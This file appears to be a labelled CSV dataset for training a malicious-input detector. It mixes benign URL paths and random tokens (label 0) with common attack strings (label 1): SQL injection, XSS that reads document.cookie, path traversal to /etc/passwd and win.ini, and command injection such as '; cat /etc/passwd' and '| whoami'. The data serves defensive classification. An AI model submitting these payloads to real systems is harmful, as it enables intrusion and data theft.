1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=709;alert(a)</script>,1
kW2T8iV0Sh0IWE,0
<script>var a=528;alert(a)</script>,1
about,0
<script>var a=425;alert(a)</script>,1
rtIxEUuBuLQjw,0
cS360zBEFCj,0
../../../windows/win.ini,1
javascript:alert(1),1
<script>var a=473;alert(a)</script>,1
cm47V2030EYlHg6,0
/login?id=7062,0
login,0
admin'/* bypass */OR 1=1,1
<script>var a=244;alert(a)</script>,1
search,0
admin' --,1
/about?session=17521,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=199;alert(a)</script>,1
<script>var a=324;alert(a)</script>,1
yddpX5EYP4,0
<script>var a=413;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=417;alert(a)</script>,1
blog,0
/register?session=65079,0
/home?id=6168,0
' OR 4=3 --,1
n8ja5EyFa7,0
<script>var a=246;alert(a)</script>,1
' OR 9=5 --,1
/login?session=31810,0
/login?session=11121,0
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
X3zqqQew8vQnGTN,0
about,0
1' o r '1'='1,1
profile,0
/dashboard?id=392,0
../../../../etc/passwd,1
/profile?id=5336,0
login,0
../../../windows/win.ini,1
3J8ircs6Ivh,0
s E l E c T * f R o M a d m i n,1
/home?id=6198,0
../../../windows/win.ini,1
/register?id=2761,0
javascript:alert(1),1
No759ahV4zQ2h,0
<script>alert(document.cookie)</script>,1
/contact?session=71951,0
' OR 8=7 --,1
/login?session=93224,0
s E l E c T * f R o M a d m i n,1
' OR 6=2 --,1
' OR 6=1 --,1
| whoami,1
/login?session=27626,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
/home?id=8576,0
cart,0
login,0
/dashboard?session=82463,0
cart,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
p99tudTx,0
<script>var a=283;alert(a)</script>,1
../../../windows/win.ini,1
/user?id=6035,0
' OR 5=7 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
' OR 9=7 --,1
<script>alert(document.cookie)</script>,1
/about?id=9004,0
checkout,0
' OR 8=4 --,1
/about?id=7073,0
index,0
<script>var a=342;alert(a)</script>,1
/checkout?session=13156,0
<script>var a=598;alert(a)</script>,1
eP0itmi8,0
dGMpg0wWZf,0
/home?id=462,0
profile,0
/home?id=9287,0
/user?session=72112,0
admin'/* bypass */OR 1=1,1
/search?session=37102,0
<script>var a=960;alert(a)</script>,1
dashboard,0
/dashboard?session=26583,0
/checkout?id=7820,0
checkout,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=28780,0
ZvQKjCxi,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
wGScHqKhE,0
/dashboard?id=273,0
/checkout?session=98787,0
/contact?session=84647,0
/about?session=94898,0
/settings?session=96983,0
s2l137UiAfKmyr0,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?id=2079,0
' OR 7=3 --,1
9yuklXC8KfPei,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
/checkout?session=70396,0
register,0
search,0
h5LfWj6FrvwKNJ,0
/dashboard?session=21613,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
6fKGAg9A6,0
' OR 7=2 --,1
register,0
' OR 2=2 --,1
| whoami,1
/settings?session=46308,0
ynoM07kz,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?session=25323,0
/login?session=11044,0
1' o r '1'='1,1
/contact?session=21477,0
checkout,0
/contact?id=2628,0
/cart?session=77039,0
/about?id=6224,0
s E l E c T * f R o M a d m i n,1
VDbOMp6xc3Ci1H,0
s E l E c T * f R o M a d m i n,1
/about?id=2193,0
YvbWEXX3,0
' OR 4=4 --,1
/checkout?id=1586,0
home,0
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
javascript:alert(1),1
../../../windows/win.ini,1
cart,0
' OR 1=9 --,1
/contact?id=5595,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
cart,0
<script>var a=338;alert(a)</script>,1
/register?session=30697,0
search,0
' OR 1=6 --,1
<script>var a=273;alert(a)</script>,1
| whoami,1
s E l E c T * f R o M a d m i n,1
contact,0
admin'/* bypass */OR 1=1,1
<script>var a=389;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
cKv85prLWMJTrG,0
/checkout?session=53550,0
/blog?id=7979,0
admin'/* bypass */OR 1=1,1
dashboard,0
/blog?session=54105,0
javascript:alert(1),1
K9K3wLNRBNUTKcZ,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?id=1958,0
/settings?id=1001,0
0GrUtSeEEag0L,0
VCjMQQzM8WhqF,0
/cart?id=410,0
' OR '1'='1,1
/search?id=6377,0
/search?session=40500,0
/about?session=91927,0
settings,0
/profile?session=31134,0
iPOV9Kl0zhMS1,0
/search?session=63780,0
qEJqKkOY4rz8XTD,0
' OR 2=6 --,1
' OR 2=2 --,1
Q5QTmKgF,0
contact,0
about,0
/profile?id=2566,0
/user?session=35376,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
<script>var a=716;alert(a)</script>,1
zKrGyrBl14OL,0
cnDyewYzEYg,0
javascript:alert(1),1
/checkout?session=79936,0
../../../../etc/passwd,1
admin' --,1
sSHREOCM,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
kehUsf4Unp,0
admin' --,1
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
bUdsch080,0
; cat /etc/passwd,1
VPqNnx98SwV,0
../../../../etc/passwd,1
/user?id=4470,0
/index?session=52418,0
' OR 6=9 --,1
/contact?session=24297,0
' OR 1=1 --,1
| whoami,1
' OR 1=1 --,1
1' o r '1'='1,1
contact,0
<script>var a=732;alert(a)</script>,1
../../../windows/win.ini,1
dashboard,0
admin' --,1
' OR 8=2 --,1
' OR 7=3 --,1
admin%00' OR 1=1,1
' OR 7=9 --,1
profile,0
about,0
/about?id=3523,0
javascript:alert(1),1
<script>var a=311;alert(a)</script>,1
<script>var a=258;alert(a)</script>,1
<script>var a=44;alert(a)</script>,1
home,0
/blog?session=95544,0
/search?session=98083,0
' OR 6=4 --,1
<script>var a=22;alert(a)</script>,1
admin' --,1
admin%00' OR 1=1,1
' OR 6=8 --,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
/dashboard?id=4126,0
<script>var a=355;alert(a)</script>,1
<script>var a=106;alert(a)</script>,1
0tBzU4vgiOzU7,0
/login?session=95431,0
/login?id=1226,0
blog,0
/blog?session=57669,0
dashboard,0
/contact?id=72,0
s E l E c T * f R o M a d m i n,1
DauLKRMiK42yIi,0
register,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
/home?session=94633,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
search,0
' OR 4=5 --,1
/checkout?session=25643,0
/settings?id=2562,0
' OR 5=7 --,1
dashboard,0
/login?session=64590,0
javascript:alert(1),1
' OR 6=4 --,1
iV7Tpvk2yvZ,0
/contact?id=8683,0
/index?id=184,0
' OR 8=5 --,1
/home?id=404,0
| whoami,1
' OR 1=1 --,1
/cart?session=58108,0
/settings?id=3024,0
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
/search?session=16967,0
5C3NZxhel,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
nrHlglP8aCYZ,0
1' o r '1'='1,1
/login?session=35607,0
' OR 8=1 --,1
' OR 8=6 --,1
' OR '1'='1,1
profile,0
<script>var a=930;alert(a)</script>,1
/contact?id=3026,0
clqg7mwxUuy,0
/dashboard?session=78450,0
/home?session=89904,0
<script>var a=490;alert(a)</script>,1
OvUJvlY1HYmqA,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=2510,0
/home?session=23084,0
NSWjYHxJBgU,0
/login?session=66700,0
/blog?session=91775,0
javascript:alert(1),1
admin%00' OR 1=1,1
' OR 2=5 --,1
rpnqaBzFwPp9,0
/dashboard?id=8994,0
/blog?id=968,0
/settings?id=2430,0
' OR 1=8 --,1
' OR 7=9 --,1
/profile?session=73342,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
d6aF5sYcb,0
onerror=alert(1),1
onerror=alert(1),1
<script>var a=526;alert(a)</script>,1
/home?id=160,0
' OR 5=4 --,1
/contact?session=23641,0
/home?session=28784,0
/search?session=82266,0
admin' --,1
/login?session=34462,0
index,0
<script>var a=981;alert(a)</script>,1
' OR 2=7 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
0ZoIcDQHOSW5r,0
/register?session=51916,0
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
onerror=alert(1),1
admin' --,1
javascript:alert(1),1
dashboard,0
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
0Hisobm5AQE,0
DblmVlaZLn30zU,0
/blog?id=1132,0
user,0
/home?id=8647,0
/about?id=6938,0
../../../../etc/passwd,1
admin' --,1
| whoami,1
index,0
/settings?id=3277,0
onerror=alert(1),1
kaz8T76eU,0
XWyIOZY2SW,0
/home?session=73383,0
' OR '1'='1,1
/about?session=62805,0
admin%00' OR 1=1,1
' OR 5=4 --,1
/cart?id=54,0
about,0
<script>var a=55;alert(a)</script>,1
javascript:alert(1),1
<script>var a=212;alert(a)</script>,1
/settings?session=16925,0
' OR 3=1 --,1
42yIrcnl5YkTqT2,0
' OR 7=9 --,1
' OR 4=8 --,1
/contact?id=7966,0
/about?session=86468,0
<script>var a=758;alert(a)</script>,1
javascript:alert(1),1
/cart?id=6072,0
1' o r '1'='1,1
' OR '1'='1,1
/home?id=8453,0
1' o r '1'='1,1
../../../windows/win.ini,1
' OR 1=4 --,1
search,0
admin' --,1
<script>var a=495;alert(a)</script>,1
/contact?id=5419,0
' OR '1'='1,1
YCVOoejRz6e5fzT,0
' OR 2=8 --,1
dashboard,0
/home?id=6520,0
<script>var a=20;alert(a)</script>,1
/register?id=2813,0
' OR 1=1 --,1
1' o r '1'='1,1
settings,0
login,0
/home?id=7362,0
aNSvSzXQ8znsys,0
search,0
/home?id=9794,0
/home?id=758,0
home,0
6CkjTPa7fC,0
| whoami,1
/about?session=61557,0
blog,0
admin%00' OR 1=1,1
javascript:alert(1),1
user,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
/settings?id=2338,0
/home?id=4724,0
/contact?id=4404,0
<script>var a=892;alert(a)</script>,1
' OR 7=1 --,1
checkout,0
/blog?session=86191,0
contact,0
hnBwXK5R6,0
javascript:alert(1),1
/home?id=6690,0
DzDu25CwmZz9vD,0
../../../../etc/passwd,1
/login?session=44645,0
1' o r '1'='1,1
' OR 3=3 --,1
' OR 5=9 --,1
index,0
s E l E c T * f R o M a d m i n,1
<script>var a=75;alert(a)</script>,1
javascript:alert(1),1
' OR 2=6 --,1
<script>var a=489;alert(a)</script>,1
settings,0
<script>var a=977;alert(a)</script>,1
<script>var a=476;alert(a)</script>,1
<script>var a=103;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
../../../windows/win.ini,1
/home?id=4311,0
nM0hA9I9OFstlA,0
<script>var a=333;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/register?id=1673,0
; cat /etc/passwd,1
/user?id=1797,0
| whoami,1
index,0
/profile?session=40096,0
/profile?id=2384,0
OrugiVQvN7,0
SkR0MS3gHno,0
admin%00' OR 1=1,1
' OR 9=3 --,1
' OR '1'='1,1
admin'/* bypass */OR 1=1,1
' OR 9=6 --,1
/about?id=8262,0
/profile?id=5395,0
IQpQfBy11WJ,0
<script>alert(document.cookie)</script>,1
<script>var a=731;alert(a)</script>,1
KTBxX5Qg0p4p,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=702;alert(a)</script>,1
/blog?id=1624,0
<script>var a=186;alert(a)</script>,1
javascript:alert(1),1
' OR 8=8 --,1
' OR '1'='1,1
admin'/* bypass */OR 1=1,1
/blog?session=41879,0
../../../windows/win.ini,1
../../../windows/win.ini,1
' OR 8=6 --,1
' OR 1=2 --,1
admin%00' OR 1=1,1
admin'/* bypass */OR 1=1,1
/blog?session=27826,0
<script>var a=449;alert(a)</script>,1
/user?session=47311,0
checkout,0
1' o r '1'='1,1
search,0
' OR 6=3 --,1
onerror=alert(1),1
<script>var a=810;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
h6NeiORTyw,0
/index?session=85211,0
/settings?session=66373,0
; cat /etc/passwd,1
BUx0zvMiuefIP,0
../../../../etc/passwd,1
' OR 2=8 --,1
' OR '1'='1,1
<script>var a=207;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
/login?session=68057,0
settings,0
' OR 1=1 --,1
/blog?session=37988,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
dashboard,0
cart,0
' OR 1=8 --,1
; cat /etc/passwd,1
admin' --,1
<script>var a=902;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
search,0
/user?id=8436,0
/profile?id=3692,0
/user?id=5996,0
SNTvypek,0
ZTUOmk5u1ruuLyt,0
UWGCIO2kSdj,0
' OR 5=1 --,1
' OR 4=1 --,1
../../../../etc/passwd,1
dashboard,0
' OR 9=3 --,1
' OR 6=2 --,1
' OR 8=6 --,1
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
2Uuxt59Zg,0
' OR 9=6 --,1
' OR 8=5 --,1
<script>var a=642;alert(a)</script>,1
<script>var a=165;alert(a)</script>,1
admin%00' OR 1=1,1
0TRU3Ub4,0
/blog?id=5759,0
/user?session=35926,0
/register?id=7097,0
<script>var a=99;alert(a)</script>,1
/blog?id=9757,0
/about?id=671,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
t3mJ0ZFjv,0
rPgtrnCVm1hEzRo,0
/about?session=66445,0
' OR 8=4 --,1
/profile?session=42389,0
/login?session=13320,0
' OR 1=1 --,1
admin%00' OR 1=1,1
dashboard,0
' OR 9=5 --,1
tfPhTDt8o7vM8yZ,0
/cart?id=2643,0
<script>var a=448;alert(a)</script>,1
' OR '1'='1,1
about,0
blog,0
Fgezp2MiZnKZco,0
profile,0
/checkout?id=8818,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
' OR 1=6 --,1
/index?session=88512,0
admin'/* bypass */OR 1=1,1
contact,0
/dashboard?session=91221,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
javascript:alert(1),1
<script>var a=448;alert(a)</script>,1
about,0
' OR '1'='1,1
Gb698JLsW031X9,0
/contact?session=52336,0
/home?id=6228,0
/profile?id=2709,0
user,0
/home?session=68250,0
/blog?id=3490,0
/dashboard?session=58811,0
' OR 1=1 --,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
<script>var a=65;alert(a)</script>,1
/settings?id=1768,0
admin' --,1
<script>var a=220;alert(a)</script>,1
' OR 1=7 --,1
/profile?session=73565,0
<script>var a=645;alert(a)</script>,1
| whoami,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
65iK2StNpux,0
; cat /etc/passwd,1
cXXIQEmf2,0
/blog?id=6762,0
../../../windows/win.ini,1
../../../windows/win.ini,1
admin%00' OR 1=1,1
/user?id=997,0
/contact?session=36738,0
/index?session=79662,0
<script>var a=172;alert(a)</script>,1
cart,0
/register?session=73569,0
contact,0
/index?id=8424,0
/search?id=7897,0
/profile?session=41901,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
a8bwuBGbZSD,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
<script>var a=876;alert(a)</script>,1
/about?id=666,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=62361,0
/search?id=9354,0
PVxyQH0nH,0
<script>var a=460;alert(a)</script>,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
javascript:alert(1),1
/blog?session=64585,0
' OR 2=4 --,1
' OR 1=1 --,1
search,0
/checkout?id=4607,0
admin'/* bypass */OR 1=1,1
5pO8Yk6E9,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
' OR 7=5 --,1
/blog?session=42312,0
home,0
/home?id=5397,0
admin' --,1
home,0
' OR 4=2 --,1
login,0
PjZ8hp87,0
<script>var a=23;alert(a)</script>,1
/home?id=9865,0
/blog?id=6238,0
/index?id=7111,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
/cart?session=10324,0
admin%00' OR 1=1,1
<script>var a=351;alert(a)</script>,1
' OR 2=6 --,1
yMpSlixCym,0
../../../../etc/passwd,1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
892PM5diG,0
/cart?id=9717,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
/login?session=74149,0
/contact?id=5111,0
JRdGPXtJV,0
' OR 5=5 --,1
../../../windows/win.ini,1
<script>var a=295;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
profile,0
/contact?id=2548,0
/dashboard?session=74494,0
/register?session=81778,0
/dashboard?id=1375,0
/dashboard?id=2488,0
<script>var a=494;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=7 --,1
index,0
g46D6HqLBSwN,0
contact,0
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
' OR 5=1 --,1
<script>var a=384;alert(a)</script>,1
/contact?id=4600,0
search,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
D1qlkuXyQ,0
<script>var a=478;alert(a)</script>,1
<script>var a=437;alert(a)</script>,1
dashboard,0
/search?session=28585,0
j4daOj54Ij,0
search,0
/profile?session=45304,0
/user?session=50898,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
<script>alert(document.cookie)</script>,1
/settings?session=38502,0
' OR 7=2 --,1
<script>alert(document.cookie)</script>,1
/checkout?session=71634,0
1' o r '1'='1,1
admin' --,1
/index?id=7290,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=4410,0
6IufihUPMaRddG,0
' OR 7=4 --,1
/about?id=5021,0
WHVqEWiHinmW,0
../../../windows/win.ini,1
/settings?session=15716,0
admin' --,1
profile,0
contact,0
/contact?session=95023,0
/about?id=4026,0
register,0
<script>var a=238;alert(a)</script>,1
<script>var a=110;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=5172,0
mJCMqJi6tJQzqh0,0
/user?session=67470,0
' OR 7=8 --,1
r8zZE3MNg1GfI1D,0
FrOtbomyLDxiytE,0
/index?session=21154,0
/dashboard?id=9465,0
RqMpgTHHep9y,0
<script>alert(document.cookie)</script>,1
<script>var a=872;alert(a)</script>,1
../../../windows/win.ini,1
<script>var a=628;alert(a)</script>,1
fsqkAy31AQr,0
contact,0
/contact?id=9637,0
/settings?session=31199,0
/user?id=3749,0
profile,0
' OR 1=5 --,1
' OR 1=6 --,1
admin' --,1
onerror=alert(1),1
/contact?id=9861,0
admin' --,1
checkout,0
admin'/* bypass */OR 1=1,1
/register?id=7591,0
' OR 1=5 --,1
; cat /etc/passwd,1
' OR 4=8 --,1
/profile?id=8897,0
/profile?id=2754,0
s E l E c T * f R o M a d m i n,1
../../../windows/win.ini,1
<script>var a=260;alert(a)</script>,1
; cat /etc/passwd,1
user,0
zhgE8hJ2mYRx,0
contact,0
/home?session=17119,0
contact,0
s E l E c T * f R o M a d m i n,1
dashboard,0
/cart?session=51717,0
/contact?id=1360,0
/about?id=7491,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=7253,0
/contact?session=55801,0
../../../windows/win.ini,1
javascript:alert(1),1
admin%00' OR 1=1,1
javascript:alert(1),1
/checkout?session=99077,0
login,0
search,0
D913j77O3OO,0
; cat /etc/passwd,1
<script>var a=263;alert(a)</script>,1
fcjCdCOGgseWIw,0
<script>var a=824;alert(a)</script>,1
1' o r '1'='1,1
' OR '1'='1,1
' OR 6=4 --,1
/checkout?id=2854,0
admin%00' OR 1=1,1
/blog?id=592,0
/home?session=99824,0
about,0
/search?id=5515,0
bvvTcdFgA17fpds,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
/login?session=28551,0
<script>var a=784;alert(a)</script>,1
1' o r '1'='1,1
javascript:alert(1),1
dashboard,0
/user?session=67422,0
/register?id=4937,0
register,0
home,0
/cart?session=25100,0
/login?id=7852,0
../../../windows/win.ini,1
/contact?session=70883,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
/search?session=11653,0
user,0
admin'/* bypass */OR 1=1,1
home,0
/settings?id=1124,0
CLVzWe84,0
/register?id=5951,0
<script>var a=113;alert(a)</script>,1
64uGzT8VFc5jU,0
' OR 8=3 --,1
' OR 4=2 --,1
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
/blog?session=95682,0
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=2 --,1
' OR 5=4 --,1
<script>var a=330;alert(a)</script>,1
KP7guB3OK4tJBkl,0
admin'/* bypass */OR 1=1,1
| whoami,1
cart,0
javascript:alert(1),1
home,0
<script>var a=68;alert(a)</script>,1
zRV6xdNHn,0
FsxKE5uC,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=84018,0
javascript:alert(1),1
<script>var a=895;alert(a)</script>,1
' OR 5=4 --,1
admin' --,1
pWnqhFnyf,0
/profile?id=2886,0
<script>var a=439;alert(a)</script>,1
/index?id=1301,0
<script>var a=604;alert(a)</script>,1
admin' --,1
../../../../etc/passwd,1
<script>var a=189;alert(a)</script>,1
<script>var a=172;alert(a)</script>,1
../../../windows/win.ini,1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
' OR 6=9 --,1
<script>var a=653;alert(a)</script>,1
s0vW9Tkx,0
' OR 3=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?id=7585,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
sJvuABvAtlmP,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=40262,0
index,0
../../../../etc/passwd,1
qFj2i5Bb4De,0
<script>var a=689;alert(a)</script>,1
home,0
<script>var a=206;alert(a)</script>,1
dashboard,0
' OR 7=1 --,1
' OR '1'='1,1
contact,0
; cat /etc/passwd,1
blog,0
user,0
' OR 1=1 --,1
' OR 2=7 --,1
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
../../../windows/win.ini,1
../../../windows/win.ini,1
/home?session=19762,0
/index?id=1270,0
1' o r '1'='1,1
admin%00' OR 1=1,1
dashboard,0
' OR 4=7 --,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
QQhri7z2vncmAf4,0
/index?id=8747,0
/index?id=2987,0
s E l E c T * f R o M a d m i n,1
' OR 7=6 --,1
vB2lRYoI0A,0
' OR 6=8 --,1
| whoami,1
Tz5Za4nwAf12wVD,0
' OR 7=9 --,1
<script>var a=158;alert(a)</script>,1
/register?session=58355,0
' OR 9=3 --,1
eaNs6maJjnSaGqz,0
/register?id=600,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
jlPvqMXoo,0
../../../../etc/passwd,1
<script>var a=288;alert(a)</script>,1
/about?id=3594,0
1' o r '1'='1,1
/login?id=2453,0
<script>alert(document.cookie)</script>,1
<script>var a=339;alert(a)</script>,1
onerror=alert(1),1
1' o r '1'='1,1
' OR 6=2 --,1
admin%00' OR 1=1,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?id=9675,0
O0nWSPCo,0
admin' --,1
/user?id=5248,0
cart,0
javascript:alert(1),1
/user?session=41184,0
/about?id=8810,0
about,0
/profile?id=229,0
<script>var a=186;alert(a)</script>,1
' OR 7=2 --,1
<script>var a=644;alert(a)</script>,1
/user?session=27871,0
/home?session=10142,0
admin' --,1
' OR 5=6 --,1
Q3EtAT7xlYwY8,0
../../../windows/win.ini,1
' OR 7=4 --,1
<script>var a=743;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/login?id=7517,0
<script>var a=790;alert(a)</script>,1
blog,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
' OR 5=2 --,1
' OR 6=9 --,1
../../../../etc/passwd,1
' OR 3=3 --,1
/settings?id=3138,0
' OR 8=8 --,1
jxEIks7PKgE,0
<script>var a=15;alert(a)</script>,1
checkout,0
; cat /etc/passwd,1
<script>var a=710;alert(a)</script>,1
/register?id=5757,0
/contact?session=80198,0
javascript:alert(1),1
/dashboard?id=3879,0
javascript:alert(1),1
ZxUGnKGrPSS,0
dashboard,0
' OR 1=3 --,1
/search?id=8207,0
onerror=alert(1),1
/settings?session=40712,0
/index?id=8120,0
' OR 5=4 --,1
admin'/* bypass */OR 1=1,1
' OR 9=7 --,1
<script>var a=112;alert(a)</script>,1
2oaeQx7gXFw1oR1,0
/search?session=39080,0
/about?id=5211,0
../../../../etc/passwd,1
/login?session=12124,0
/dashboard?session=79068,0
contact,0
' OR 2=4 --,1
' OR 1=6 --,1
/search?session=27872,0
' OR '1'='1,1
blog,0
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
settings,0
bKcWGzl9q9go,0
s E l E c T * f R o M a d m i n,1
/contact?id=3936,0
tNlQvy8kRLu,0
/settings?id=2347,0
/profile?session=40034,0
../../../../etc/passwd,1
/search?session=66682,0
home,0
<script>var a=864;alert(a)</script>,1
/login?session=75973,0
/user?session=24144,0
<script>var a=224;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=736;alert(a)</script>,1
/contact?id=1151,0
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
BTu7wvTT6JMUzZ,0
YA2ltSdnYQIKy,0
JQsszNAEl0w,0
nYis29NCP,0
tFWoKu3abNA06t,0
/contact?id=5551,0
/home?session=51549,0
about,0
' OR 8=9 --,1
/settings?session=93497,0
' OR 1=1 --,1
' OR 3=6 --,1
/dashboard?id=72,0
<script>var a=762;alert(a)</script>,1
settings,0
' OR 7=4 --,1
' OR 5=1 --,1
../../../windows/win.ini,1
/dashboard?session=39662,0
1' o r '1'='1,1
/profile?session=81708,0
' OR 2=3 --,1
/about?session=74683,0
/about?id=3773,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
admin' --,1
/checkout?id=4565,0
ME2ZQW8rrhT1,0
/contact?id=2020,0
LSDUnv7DkBd,0
' OR 7=8 --,1
s E l E c T * f R o M a d m i n,1
about,0
/home?id=5373,0
/settings?id=9889,0
../../../../etc/passwd,1
dashboard,0
/contact?session=41602,0
../../../windows/win.ini,1
/about?id=6023,0
<script>var a=152;alert(a)</script>,1
/search?session=95203,0
ZAnkf4k0ixx,0
' OR 7=8 --,1
' OR 1=1 --,1
settings,0
p56CUXFXMkRgX9,0
' OR 6=9 --,1
IBmWjbObLyJW,0
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
' OR 1=5 --,1
BzIE08XhHoA,0
admin'/* bypass */OR 1=1,1
/checkout?session=99955,0
jEoyGGRk3Qu3AAE,0
/login?session=38089,0
| whoami,1
user,0
onerror=alert(1),1
/login?id=6818,0
' OR 5=3 --,1
' OR 9=5 --,1
javascript:alert(1),1
/index?session=26074,0
' OR '1'='1,1
; cat /etc/passwd,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=6 --,1
3PFyR2BJb3OkH,0
/login?session=73074,0
/contact?session=95221,0
/home?session=21249,0
javascript:alert(1),1
/index?session=83271,0
../../../../etc/passwd,1
/blog?session=62996,0
<script>var a=791;alert(a)</script>,1
admin' --,1
/about?session=81238,0
' OR 3=4 --,1
' OR 6=1 --,1
admin'/* bypass */OR 1=1,1
/dashboard?session=96962,0
' OR 9=4 --,1
<script>var a=977;alert(a)</script>,1
/login?id=3151,0
' OR 4=9 --,1
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=1 --,1
/dashboard?session=65868,0
blog,0
blog,0
<script>var a=481;alert(a)</script>,1
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?id=3086,0
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
/register?session=85062,0
AXtPYQadpTlB3M,0
/blog?id=6426,0
settings,0
admin' --,1
' OR 2=6 --,1
/login?id=6365,0
/settings?id=9361,0
